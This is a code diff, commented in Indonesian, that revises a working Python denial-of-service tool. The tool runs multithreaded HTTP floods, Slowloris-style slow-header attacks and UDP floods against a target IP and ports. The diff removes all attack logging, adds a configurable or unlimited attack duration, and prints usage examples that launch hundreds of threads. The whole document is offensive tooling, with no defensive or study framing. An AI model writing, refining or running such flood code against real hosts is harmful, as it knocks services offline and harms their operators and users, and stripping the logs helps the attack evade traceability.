@@ -3,16 +3,12 @@ import threading
 import random
 import sys
 import time
-import logging
 import selectors
 import queue
 from colorama import init, Fore
 
 # --- Inisialisasi ---
 init()
-LOG_FILENAME = 'attack_log.txt'
-logging.basicConfig(filename=LOG_FILENAME, level=logging.INFO,
-                    format='%(asctime)s - %(levelname)s - %(message)s')
 
 # --- Banner ---
 BANNER = Fore.CYAN + r"""
@@ -36,7 +32,7 @@ lock = threading.Lock()
 # --- Thread Control ---
 stop_event = threading.Event()
 
-# --- User Agents (Diperbanyak) ---
+# --- User Agents ---
 USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
@@ -125,7 +121,7 @@ def generate_udp_packet(target_ip, target_port):
     return payload
 
 # --- Fungsi HTTP Attack dengan Multiple Sockets & Slowloris-like ---
-def http_attack_advanced(target, port, method='GET', mode='normal', num_sockets=100):
+def http_attack_advanced(target, port, method='GET', mode='normal', num_sockets=100, attack_duration=None): # Tambahkan durasi
     global sent_requests_total, error_count, active_connections, server_errors
 
     request_queue = queue.Queue()
@@ -134,7 +130,8 @@ def http_attack_advanced(target, port, method='GET', mode='normal', num_sockets=
 
     sel = selectors.DefaultSelector()
     
-    # Fungsi untuk membuka koneksi baru
+    start_time = time.time() # Catat waktu mulai untuk thread ini
+
     def open_connection():
         global active_connections
         sock = None
@@ -144,14 +141,13 @@ def http_attack_advanced(target, port, method='GET', mode='normal', num_sockets=
 
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.setblocking(False)
-            sock.settimeout(5) # Timeout untuk koneksi
+            sock.settimeout(5)
             sock.connect((target, port))
             
             sel.register(sock, selectors.EVENT_WRITE, data={'method': method, 'mode': mode, 'request_sent': False})
             
             with lock:
                 active_connections += 1
-                logging.info(f"New connection opened to {target}:{port}. Active: {active_connections}/{num_sockets}")
                 
         except (socket.gaierror, socket.timeout, ConnectionRefusedError, OSError) as e:
             with lock:
@@ -160,10 +156,8 @@ def http_attack_advanced(target, port, method='GET', mode='normal', num_sockets=
         except Exception as e:
             with lock:
                 error_count += 1
-            logging.error(f"Unexpected error opening connection: {e}")
             if sock: sock.close()
 
-    # Fungsi untuk menutup koneksi
     def close_connection(sock):
         global active_connections
         try:
@@ -171,19 +165,21 @@ def http_attack_advanced(target, port, method='GET', mode='normal', num_sockets=
             sock.close()
             with lock:
                 active_connections -= 1
-                # logging.info(f"Connection closed to {target}:{port}. Active: {active_connections}")
         except Exception as e:
-            logging.error(f"Error closing connection: {e}")
+            pass
 
-    # Buka koneksi awal
     for _ in range(num_sockets):
         open_connection()
 
     idle_loops = 0
 
-    # Loop utama untuk mengelola koneksi
     while not stop_event.is_set():
         
+        # --- Periksa durasi serangan untuk thread ini ---
+        if attack_duration is not None and (time.time() - start_time) > attack_duration:
+            # logging.info(f"Attack duration reached for {target}:{port}. Stopping thread.") # Dihapus
+            break # Keluar dari loop thread jika durasi tercapai
+
         if active_connections < num_sockets:
             open_connection()
         
@@ -192,7 +188,6 @@ def http_attack_advanced(target, port, method='GET', mode='normal', num_sockets=
         if not events and active_connections == 0:
             idle_loops += 1
             if idle_loops > 10:
-                logging.warning(f"No active connections or events for {target}:{port}. Exiting thread.")
                 break
             continue
         else:
@@ -202,7 +197,6 @@ def http_attack_advanced(target, port, method='GET', mode='normal', num_sockets=
             sock = key.fileobj
             data = key.data
 
-            # --- Event WRITE: Siap untuk mengirim data ---
             if mask & selectors.EVENT_WRITE:
                 try:
                     if not data['request_sent']:
@@ -220,52 +214,44 @@ def http_attack_advanced(target, port, method='GET', mode='normal', num_sockets=
                             slow_data = f"\r\nKeep-Alive: {random.randint(1, 10000)}"
                             sock.sendall(slow_data.encode('utf-8', errors='ignore'))
                         
-                        sel.modify(sock, selectors.EVENT_READ, data=data) # Siap untuk membaca
+                        sel.modify(sock, selectors.EVENT_READ, data=data)
                         
-                    else: # Permintaan utama sudah terkirim
+                    else:
                         if data['mode'] == 'slow':
                             try:
                                 slow_data = f"\r\nX-Ignore: {random.randint(10000, 99999)}"
                                 sock.sendall(slow_data.encode('utf-8', errors='ignore'))
                             except OSError as e:
-                                logging.warning(f"Error sending slow data to {target}:{port}: {e}")
                                 close_connection(sock)
                             
                 except (OSError, socket.timeout) as e:
-                    logging.warning(f"Write error for {target}:{port}: {e}")
                     close_connection(sock)
                 except Exception as e:
-                    logging.error(f"Unexpected error during write event: {e}")
                     close_connection(sock)
 
-            # --- Event READ: Menerima respons dari server ---
             if mask & selectors.EVENT_READ:
                 try:
                     response_chunk = sock.recv(1024)
                     if response_chunk:
                         status_code, status_line = parse_http_status(response_chunk)
                         
-                        if status_code and status_code.startswith('2'): # Sukses
+                        if status_code and status_code.startswith('2'):
                              pass
-                        elif status_code and (status_code.startswith('4') or status_code.startswith('5')): # Error
+                        elif status_code and (status_code.startswith('4') or status_code.startswith('5')):
                             with lock:
                                 server_errors += 1
-                            logging.warning(f"Server Error ({status_code}) from {target}:{port}. Snippet: {response_chunk[:100].decode('utf-8', errors='ignore')}...")
                         else:
                              pass
                         
-                        if data['mode'] == 'normal': # Jika mode normal, tutup setelah baca
+                        if data['mode'] == 'normal':
                            close_connection(sock)
                         
-                    else: # Koneksi ditutup oleh server
-                        logging.info(f"Server closed connection {target}:{port}.")
+                    else:
                         close_connection(sock)
                         
                 except (socket.timeout, OSError) as e:
-                    logging.warning(f"Read error for {target}:{port}: {e}. Closing connection.")
                     close_connection(sock)
                 except Exception as e:
-                    logging.error(f"Unexpected error during read event: {e}")
                     close_connection(sock)
 
         time.sleep(0.001)
@@ -274,12 +260,19 @@ def http_attack_advanced(target, port, method='GET', mode='normal', num_sockets=
     for sock in list(sel.get_map().keys()):
         close_connection(sock)
     sel.close()
-    logging.info(f"HTTP attack thread for {target}:{port} finished.")
+    # logging.info(f"HTTP attack thread for {target}:{port} finished.") # Dihapus
 
-# --- Fungsi UDP Attack (tetap sama) ---
-def udp_attack(target_ip, target_port):
+# --- Fungsi UDP Attack (tetap sama, tapi cek stop_event) ---
+def udp_attack(target_ip, target_port, attack_duration=None): # Tambahkan durasi
     global sent_requests_total, error_count
+    
+    start_time = time.time() # Catat waktu mulai untuk thread ini
+
     while not stop_event.is_set():
+        # --- Periksa durasi serangan untuk thread ini ---
+        if attack_duration is not None and (time.time() - start_time) > attack_duration:
+            break # Keluar dari loop thread jika durasi tercapai
+            
         s = None
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -311,7 +304,7 @@ def udp_attack(target_ip, target_port):
         time.sleep(random.uniform(0.001, 0.005))
 
 # --- Fungsi untuk menampilkan statistik secara berkala ---
-def stats_display(stop_event, target_ip): # Tambahkan target_ip sebagai argumen
+def stats_display(stop_event, target_ip):
     while not stop_event.is_set():
         with lock:
             current_sent = sent_requests_total
@@ -319,14 +312,12 @@ def stats_display(stop_event, target_ip): # Tambahkan target_ip sebagai argumen
             current_active = active_connections
             current_srv_err = server_errors
         
-        # Tampilkan IP target di sini
         progress_bar = (
             f"[{Fore.CYAN}STATS{Fore.RESET}] Target: {Fore.CYAN}{target_ip}{Fore.RESET} | "
             f"Sent: {Fore.GREEN}{current_sent}{Fore.RESET} | "
             f"Active Con: {Fore.BLUE}{current_active}{Fore.RESET} | "
             f"Srv Err: {Fore.YELLOW}{current_srv_err}{Fore.RESET} | "
-            f"Errors: {Fore.RED}{current_errors}{Fore.RESET} | "
-            f"Log: {LOG_FILENAME}"
+            f"Errors: {Fore.RED}{current_errors}{Fore.RESET}"
         )
         sys.stdout.write('\r' + progress_bar + ' ' * 10)
         sys.stdout.flush()
@@ -346,30 +337,41 @@ if __name__ == "__main__":
     try:
         time.sleep(5)
         
-        if len(sys.argv) < 6:
-            print(f"\nUsage: python3 {sys.argv[0]} <TARGET_IP> <PORT> <THREADS_PER_PORT> <ATTACK_TYPE> <MODE> [HTTP_METHOD]")
+        # Perubahan: argumen sekarang <TARGET_IP> <PORT> <THREADS_PER_PORT> <ATTACK_TYPE> <MODE> <DURATION_SEC> [HTTP_METHOD]
+        if len(sys.argv) < 7: 
+            print(f"\nUsage: python3 {sys.argv[0]} <TARGET_IP> <PORT> <THREADS_PER_PORT> <ATTACK_TYPE> <MODE> <DURATION_SEC> [HTTP_METHOD]")
+            print("DURATION_SEC: Attack duration in seconds (e.g., 60 for 1 minute, 0 for unlimited)")
             print("ATTACK_TYPE: 'http' or 'udp'")
             print("MODE: 'normal' (fast flood) or 'slow' (slowloris-like)")
             print("HTTP_METHOD (optional for 'http' type): 'GET' (default) or 'POST'")
             print("\nExample:")
-            print(f"  HTTP Normal GET:  python3 {sys.argv[0]} 192.168.1.100 80 500 http normal GET")
-            print(f"  HTTP Slow POST:   python3 {sys.argv[0]} 192.168.1.100 8080 200 http slow POST")
-            print(f"  UDP Flood:        python3 {sys.argv[0]} 192.168.1.100 53 1000 udp")
+            print(f"  HTTP Normal GET (60s):  python3 {sys.argv[0]} 192.168.1.100 80 500 http normal 60 GET")
+            print(f"  HTTP Slow POST (120s):  python3 {sys.argv[0]} 192.168.1.100 8080 200 http slow 120 POST")
+            print(f"  UDP Flood (30s):        python3 {sys.argv[0]} 192.168.1.100 53 1000 udp 30")
+            print(f"  Unlimited UDP:          python3 {sys.argv[0]} 192.168.1.100 53 1000 udp 0")
             sys.exit(1)
             
-        target_ip = sys.argv[1] # IP target disimpan untuk diteruskan ke stats_display
+        target_ip = sys.argv[1]
         port_arg = sys.argv[2]
         attack_type = sys.argv[4].lower()
         mode = sys.argv[5].lower()
         http_method = 'GET'
 
-        if mode not in ['normal', 'slow']:
-            print(f"Error: Invalid MODE '{mode}'. Use 'normal' or 'slow'.")
+        # --- Parsing Durasi ---
+        try:
+            attack_duration = int(sys.argv[6])
+            if attack_duration < 0:
+                raise ValueError("DURATION_SEC cannot be negative.")
+            if attack_duration == 0:
+                attack_duration = None # 0 berarti unlimited (sampai diinterupsi manual)
+        except ValueError as e:
+            print(f"Error parsing duration: {e}")
             sys.exit(1)
 
+        # Validasi HTTP Method
         if attack_type == 'http':
-            if len(sys.argv) > 6:
-                http_method = sys.argv[6].upper()
+            if len(sys.argv) > 7:
+                http_method = sys.argv[7].upper()
                 if http_method not in ['GET', 'POST']:
                     print(f"Error: Invalid HTTP method '{http_method}'. Use 'GET' or 'POST'.")
                     sys.exit(1)
@@ -412,15 +414,12 @@ if __name__ == "__main__":
             print("Error: No valid ports specified.")
             sys.exit(1)
 
-        print(f"\n{Fore.GREEN}Starting {attack_type.upper()} ({mode.upper()}) attack on {target_ip} on ports {ports_to_attack} with {threads_per_port} threads/port (Method: {http_method})...{Fore.RESET}")
-        logging.info(f"Starting {attack_type.upper()} ({mode.upper()}) attack on {target_ip} on ports {ports_to_attack} with {threads_per_port} threads/port (Method: {http_method}).")
-
-        # Thread untuk menampilkan statistik, sekarang dengan IP target
+        print(f"\n{Fore.GREEN}Starting {attack_type.upper()} ({mode.upper()}) attack on {target_ip} on ports {ports_to_attack} with {threads_per_port} threads/port (Method: {http_method}). Duration: {'Unlimited' if attack_duration is None else f'{attack_duration}s'}...{Fore.RESET}")
+        
         stats_thread = threading.Thread(target=stats_display, args=(stop_event, target_ip))
         stats_thread.daemon = True
         stats_thread.start()
 
-        # --- Pengelolaan Thread untuk Serangan ---
         attack_threads = []
         
         NUM_SOCKETS_PER_THREAD = 50
@@ -431,7 +430,7 @@ if __name__ == "__main__":
             for port in ports_to_attack:
                 for _ in range(threads_per_port):
                     thread = threading.Thread(target=http_attack_advanced, 
-                                              args=(target_ip, port, http_method, mode, NUM_SOCKETS_PER_THREAD))
+                                              args=(target_ip, port, http_method, mode, NUM_SOCKETS_PER_THREAD, attack_duration))
                     thread.daemon = True
                     attack_threads.append(thread)
                     thread.start()
@@ -439,14 +438,27 @@ if __name__ == "__main__":
         elif attack_type == 'udp':
             for port in ports_to_attack:
                 for _ in range(threads_per_port):
-                    thread = threading.Thread(target=udp_attack, args=(target_ip, port))
+                    thread = threading.Thread(target=udp_attack, args=(target_ip, port, attack_duration))
                     thread.daemon = True
                     attack_threads.append(thread)
                     thread.start()
         
-        # Jaga agar program utama tetap berjalan
-        while not stop_event.is_set():
-            time.sleep(1)
+        # --- Loop Utama untuk Menangani Durasi Serangan ---
+        if attack_duration is not None:
+            attack_start_time = time.time()
+            while time.time() - attack_start_time < attack_duration:
+                time.sleep(1)
+                # Periksa jika ada interupsi manual yang terjadi sebelum durasi selesai
+                if stop_event.is_set():
+                    break
+            
+            print(f"\n{Fore.YELLOW}Attack duration ({attack_duration}s) reached. Stopping attack...{Fore.RESET}")
+            stop_event.set() # Memberi sinyal untuk menghentikan thread
+        else:
+            # Jika durasi unlimited, tunggu sampai ada interupsi manual
+            while not stop_event.is_set():
+                time.sleep(1)
+
             
     except KeyboardInterrupt:
         print("\nAttack stopped by user. Exiting...")
@@ -457,11 +469,8 @@ if __name__ == "__main__":
         for t in attack_threads:
             t.join(timeout=0.5) 
             
-        logging.info("Attack stopped by user.")
         sys.exit(0)
     except Exception as e:
         print(f"\nAn unexpected error occurred in the main thread: {e}")
         stop_event.set()
-        logging.critical(f"Main thread error: {e}")
         sys.exit(1)
-
